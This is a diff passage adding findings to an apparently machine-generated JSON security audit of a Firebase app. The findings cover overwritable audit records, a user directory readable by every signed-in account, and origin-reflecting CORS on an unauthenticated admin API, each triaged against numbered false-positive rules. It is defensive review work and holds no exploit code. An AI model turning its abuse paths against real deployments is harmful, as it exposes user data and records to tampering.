+          "reason": "Rules are the enforcement layer for direct client access, so this is the control rather than an extra one."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/firestore.rules:46"
+        ],
+        "established_by": "Matched every Firestore path used by the client and the functions against the rule blocks: orgs/<id>/notes matches only the recursive wildcard, and the /notes/{noteId} block at line 35 matches no path the code actually uses.",
+        "narrowed_by": "The caller must be a member of the organisation \u2014 but membership is itself self-assignable through the profiles write rule at firestore.rules:31, so this narrowing does not hold against a determined attacker."
+      }
+    },
+    {
+      "title": "Audit records are client-addressable and overwritable",
+      "location": {
+        "path": "fieldnotes/functions/index.js",
+        "symbol": "seal handler",
+        "line": 61
+      },
+      "class": "Audit trail tampering",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The document id is built from client-supplied values \u2014 orgId and seq both come from normalizeRequest(req.body) at line 60 \u2014 and the write uses .set() at line 62, which replaces any existing document rather than failing. No check confirms that the caller belongs to orgId or owns the note being sealed. The rules file describes this collection as an 'Immutable trail written by the audit function with the Admin SDK' and denies all client writes (firestore.rules:50-53), but the Admin SDK is not subject to rules.",
+      "impact": "Any holder of a valid Firebase ID token overwrites an existing audit record by naming its orgId and seq, replacing the sealedBy and noteId of a prior seal, or fabricates audit entries for organisations they have no relationship with. The one collection meant to be tamper-evident is neither append-only nor authorised.",
+      "recommendation": "Let the server generate the audit id (add() or a uuid), use create semantics so an existing id fails, and verify the caller's membership of orgId and access to the note before writing.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "orgId and seq come from the request body at line 60; the sanitiser at lines 34-35 strips characters but preserves the caller's ability to choose the value."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigations present were credited: requireIdToken does run on this app (line 43) and normalizeRequest does prevent path injection into the document reference. Neither addresses authorization or overwrite semantics."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The handler chooses .set() and derives the id from input; no caller misuse is required."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/functions/index.js:61",
+          "fieldnotes/functions/index.js:62"
+        ],
+        "established_by": "Read the handler alongside the audits rule block; the write path is the only writer to that collection in the corpus, and the rules confirm it is meant to be the sole, trusted one.",
+        "narrowed_by": "A valid Firebase ID token is required, since requireIdToken is mounted on this app at index.js:43 \u2014 unlike adminApi, this route is at least authenticated."
+      }
+    },
+    {
+      "title": "Every signed-in user can read every inspector profile",
+      "location": {
+        "path": "fieldnotes/firestore.rules",
+        "symbol": "match /profiles/{uid} allow read",
+        "line": 30
+      },
+      "class": "Excessive data exposure",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "The read rule is 'signedIn()' with no relationship requirement. auth.js:24-30 shows each profile carries displayName, email, role and the full orgs list. Any authenticated account \u2014 including one created through the self-service register path at auth.js:35 \u2014 can therefore enumerate the whole user directory.",
+      "impact": "Discloses the email address, role and organisation memberships of every inspector to any account holder, which is both a privacy exposure and useful reconnaissance for the escalation and impersonation paths reported elsewhere in this module.",
+      "recommendation": "Restrict profile reads to the subject and to members of a shared organisation, and move email out of the client-readable document if a directory view is required.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is an access-control predicate on personal data, not a missing response header or a mock fixture."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Any authenticated client reads the collection directly through the Firestore SDK; no server handler mediates it."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a resource-exhaustion concern."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/firestore.rules:30"
+        ],
+        "established_by": "Read the rule and cross-referenced the document shape written by auth.js:24-30 to establish which fields the permission actually exposes.",
+        "narrowed_by": "An authenticated account is required, though the app allows self-service registration (auth.js:35-39), so obtaining one is not a meaningful barrier."
+      }
+    },
+    {
+      "title": "Cloud Function CORS reflects any requesting origin",
+      "location": {
+        "path": "fieldnotes/functions/index.js",
+        "symbol": "corsMiddleware",
+        "line": 15
+      },
+      "class": "Overly permissive CORS",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "A single cors({ origin: true }) instance is created at line 15 and mounted on both express apps, at line 42 for api and at line 72 for adminApi. origin: true echoes the requesting Origin header back in access-control-allow-origin. The comment at lines 10-14 justifies this on the grounds that callers authenticate with a bearer token rather than a cookie \u2014 which is true of api, where requireIdToken is mounted, but not of adminApi, which has no authentication at all.",
+      "impact": "For adminApi, reflecting the origin means a page on any site can both call the unauthenticated admin routes and read their responses, turning the missing authentication into a drive-by member-list disclosure from a visitor's browser. For api the reasoning in the comment holds and the exposure is negligible.",
+      "recommendation": "Restrict the origin list to the portal domains, and in any case fix the missing authentication on adminApi \u2014 the CORS setting only determines whether the attacker can read the response, not whether the request executes.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 02 excludes missing hardening headers. Here a header is present and grants read access that the same-origin policy would otherwise deny, on an endpoint with no other access control."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The bearer-token reasoning in the comment was accepted for the app where it applies; the finding is confined to the mount where the premise is false."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The Origin header is attacker-controlled, and origin: true reflects it verbatim."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/functions/index.js:15",
+          "fieldnotes/functions/index.js:42",
+          "fieldnotes/functions/index.js:72"
+        ],
+        "established_by": "One cors instance is constructed in the file; grepped corsMiddleware to enumerate its two mounts, both listed above. The onCall export at line 88 uses the Firebase callable protocol and does not go through this middleware.",
+        "narrowed_by": "Credentials are not enabled and the api app requires a bearer token the browser never attaches automatically, so the practical exposure is confined to the unauthenticated adminApi mount at index.js:72."
+      }
+    }
+  ]
+}
